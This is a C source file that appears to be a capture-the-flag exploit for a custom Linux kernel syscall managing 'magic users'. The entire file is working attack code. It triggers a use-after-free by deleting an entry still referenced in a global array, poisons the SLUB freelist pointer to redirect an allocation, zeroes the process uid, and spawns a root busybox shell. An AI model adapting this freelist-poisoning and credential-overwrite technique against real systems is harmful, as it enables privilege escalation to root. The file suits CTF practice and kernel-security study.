#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/syscall.h>
#include <unistd.h>

#define SYS_MAGIC 449
#define MAGIC(...) \
  syscall(SYS_MAGIC, __VA_ARGS__)
#define DO_ADD(user) MAGIC(MAGIC_ADD, &user.name, &user.pass)
#define DO_EDIT(user) MAGIC(MAGIC_EDIT, &user.name, &user.pass)
#define DO_DELETE(user) MAGIC(MAGIC_DELETE, &user.name)
#define DO_SWITCH0(user) MAGIC(MAGIC_SWITCH, &user.name, &user.pass)
#define DO_SWITCH1(user) MAGIC(MAGIC_SWITCH, &user.name, NULL)

typedef enum {
    MAGIC_ADD = 0,
    MAGIC_EDIT = 1,
    MAGIC_DELETE = 2,
    MAGIC_SWITCH = 3,
} MagicMode;

#define INIT_USER(sym) user_t sym = {.name = {0}, .pass = {0}}
typedef struct user user_t;
struct user {
  char name[65];
  char pass[65];
};
static inline void user_init(user_t* user, const char* str) {
  memcpy(user->name, str, strlen(str));
  memcpy(user->pass, str, strlen(str));
  return;
}

static void pwn0(void) {

}

static void pwn1(void) {
  static INIT_USER(a);
  static INIT_USER(b);
  static INIT_USER(c);
  static INIT_USER(d);

  user_init(&a, "AAAAAAAA");
  user_init(&b, "BBBBBBBB");
  user_init(&c, "CCCCCCCC");
  user_init(&d, "DDDDDDDD");

  // magic_users: a -> b -> c
  DO_ADD(a);
  DO_SWITCH1(a);
  DO_ADD(b);
  DO_SWITCH1(b);
  DO_ADD(c);

  // magic_users: a -> c
  // ptr still in global array
  DO_SWITCH0(a); 
  DO_DELETE(b);
  DO_ADD(b);

  DO_SWITCH0(c);
  memset(&c.pass, 'Z', 64);

  // overwrite slub slot freelist ptr
  unsigned long buffer[24] = {0};
  ((unsigned long *)&c.pass)[2] = (unsigned long)&buffer;
  DO_EDIT(c);

  // alloc more chunks to force chunk ptr
  DO_SWITCH0(a);
  DO_ADD(d);
  DO_ADD(c);

  for (int i = 0 ; i < 24; ++i)
    printf("%lx\n", buffer[i]);

  // overwrite uid, win!
  buffer[0] = 0;
  DO_SWITCH0(c);

  if (!getuid()) {
    puts("getuid() == 0, xpl worked!");
    execve("/busybox", (char* const[]){"busybox", "sh"}, NULL);
  }
  return;
}

int main(int argc, char** argv) {
  pwn1();
}
